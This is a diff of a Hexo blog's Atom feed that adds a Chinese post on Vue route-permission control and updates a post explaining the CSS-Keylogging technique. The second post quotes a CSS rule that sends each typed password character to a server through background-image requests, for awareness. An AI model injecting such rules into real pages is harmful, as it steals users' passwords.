@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.minfive.com/"/>
-  <updated>2018-02-23T15:10:09.505Z</updated>
+  <updated>2018-03-03T13:57:42.575Z</updated>
   <id>http://blog.minfive.com/</id>
   
   <author>
@@ -17,11 +17,40 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>关于 Vue 的路由权限管理</title>
+    <link href="http://blog.minfive.com/2018/03/03/2018-03-03-vue-permission-control/"/>
+    <id>http://blog.minfive.com/2018/03/03/2018-03-03-vue-permission-control/</id>
+    <published>2018-03-02T16:00:00.000Z</published>
+    <updated>2018-03-03T13:57:42.575Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>曾经在工作上对 vue 路由权限管理这方面有过研究，这几天又看到了几篇相关的文章，再加上昨天电面中又再一次提及到，就索性整理了一下自己的一些看法，希望对大家有帮助。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>大体上实现的思路很简单，先上图：</p><p><img src="http://oo12ugek5.bkt.clouddn.com/blog/images/18-03-03/route-permission-control.png" alt="permission-control"></p><p>无非是将路由配置按用户类型分割为 <code>用户路由</code> 和 <code>基本路由</code>，不同的用户类型可能存在不同的 <code>用户路由</code>，具体依赖实际业务。</p><ul><li><code>用户路由</code>: 当前用户所特有的路由</li><li><code>基本路由</code>：所有用户均可以访问的路由</li></ul><p>实现控制的方式分两种：</p><ol><li>通过 <a href="https://router.vuejs.org/zh-cn/api/router-instance.html#methods" target="_blank" rel="external">vue-router addRoutes</a> 方法注入路由实现控制</li><li>通过 <a href="https://router.vuejs.org/zh-cn/api/router-instance.html#methods" target="_blank" rel="external">vue-router beforeEach</a> 钩子限制路由跳转</li></ol><ul><li>addRoutes 方式：</li></ul><blockquote><p>通过请求服务端获取当前用户路由配置，编码为 vue-router 所支持的基本格式（具体如何编码取决于前后端协商好的数据格式），通过调用 <code>this.$router.addRoutes</code> 方法将编码好的用户路由注入到现有的 vue-router 实例中去，以实现用户路由。</p></blockquote><ul><li>beforeEach 方式</li></ul><blockquote><p>通过请求服务端获取当前用户路由配置，通过注册 <code>router.beforeEach</code> 钩子对路由的每次跳转进行管理，每次跳转都进行检查，如果目标路由不存再于 <code>基本路由</code> 和 当前用户的 <code>用户路由</code> 中，取消跳转，转为跳转错误页。</p></blockquote><p><strong>以上两种方式均需要在 <code>vue-router</code> 中配置错误页，以保证用户感知权限不足。</strong></p><p>两种方式的原理其实都是一样的，只不过 <code>addRoutes 方式</code> 通过注入路由配置告诉 <code>vue-router</code> ：“当前我们就只有这些路由，其它路由地址我们一概不认”，而 <code>beforeEach</code> 则更多的是依赖我们手动去帮 <code>vue-router</code> 辨别什么页面可以去，什么页面不可以去。说白了也就是 <code>自动</code> 与 <code>手动</code> 的差别。说到这，估计大家都会觉得既然是 <code>自动</code> 的，那肯定是 <code>addRoutes</code> 最方便快捷了，还能简化业务代码，笔者一开始也是这么认为的，但是！很多人都忽略了一点：</p><p><img src="http://oo12ugek5.bkt.clouddn.com/blog/images/18-03-03/vue-router-addRoutes.png" alt="vue-router-addRoutes"></p><p><strong><code>addRoutes</code> 方法仅仅是帮你注入新的路由，并没有帮你剔除其它路由！</strong></p><p>设想存在这么一种情况：用户在自己电脑上登录了管理员账号，这个时候会向路由中注入<strong>管理员的路由</strong>，然后再退出登录，保持页面不刷新，改用普通用户账号进行登录，这个时候又会向路由中注入<strong>普通用户的路由</strong>，那么，在路由中将存在两种用户类型的路由，即使用户不感知，通过改变 url，普通用户也可以访问管理员的页面！</p><p>对于这个问题，也有一个解决办法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></div><div class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">'vue-router'</span></div><div class="line"></div><div class="line">Vue.use(Router)</div><div class="line"></div><div class="line"><span class="keyword">const</span> createRouter = <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">new</span> Router(&#123;</div><div class="line">  mode: <span class="string">'history'</span>,</div><div class="line">  routes: []</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="keyword">const</span> router = createRouter()</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">resetRouter</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">const</span> newRouter = createRouter()</div><div class="line">  router.matcher = newRouter.matcher</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</div></pre></td></tr></table></figure><p>通过新建一个全新的 <code>Router</code>，然后将新的 <code>Router.matcher</code> 赋给当前页面的管理 <code>Router</code>，以达到更新路由配置的目的。</p><p>笔者做了一个<a href="https://github.com/MinFE/vue-router-premission-control-demo" target="_blank" rel="external">小demo</a>，大家可以去<a href="https://minfe.github.io/vue-router-premission-control-demo/" target="_blank" rel="external">体验一下</a>。</p><p>关于上述问题，在 <a href="https://github.com/vuejs/vue-router" target="_blank" rel="external">vue-router</a> 的 github issues 下有过讨论，分别是：</p><ul><li><a href="https://github.com/vuejs/vue-router/issues/1436" target="_blank" rel="external">Add option to Reset/Delete Routes #1436</a></li><li><a href="https://github.com/vuejs/vue-router/issues/1234" target="_blank" rel="external">Feature request: replace routes dynamically #1234</a></li></ul><p>有兴趣的可以去围观下。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;曾经在工作上对 vue 路由权限管理这方面有过研究，这几天又看到了几篇相关的文章，再加上昨天电面中又再一次提及到，就索性整理了一下自己的一些
+      
+    
+    </summary>
+    
+      <category term="经验总结" scheme="http://blog.minfive.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
+    
+    
+      <category term="javascript" scheme="http://blog.minfive.com/tags/javascript/"/>
+    
+      <category term="vue" scheme="http://blog.minfive.com/tags/vue/"/>
+    
+      <category term="权限管理" scheme="http://blog.minfive.com/tags/%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
+    
+  </entry>
+  
+  <entry>
     <title>使用 Css 获取用户密码</title>
     <link href="http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/"/>
     <id>http://blog.minfive.com/2018/02/23/2018-02-23-css-hacker/</id>
     <published>2018-02-22T16:00:00.000Z</published>
-    <updated>2018-02-23T15:10:09.505Z</updated>
+    <updated>2018-03-03T05:08:01.136Z</updated>
     
     <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>新年工作第一天，在 github 上闲逛，发现了一个很有趣的项目，叫 <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a>，这是一个演示如何用 css 去获取用户输入的密码的项目，这个项目与一两个月前的另外一个很火的项目 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="external">CrookedStyleSheets</a> 类似，甚至于有可能 <a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a> 就是受 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="external">CrookedStyleSheets</a> 启发才创建的。</p><h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p><p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="external">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="external">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="external">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p><h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="external">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p><p>核心代码如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">input</span><span class="selector-attr">[type="password"]</span><span class="selector-attr">[value$="1"]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">"http://localhost:3000/1"</span>); &#125;</div></pre></td></tr></table></figure><p>解释如下：</p><p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p><p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p><p><img src="http://oo12ugek5.bkt.clouddn.com/blog/images/18-02-23/code.png" alt="code"></p><p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>]]></content>
     
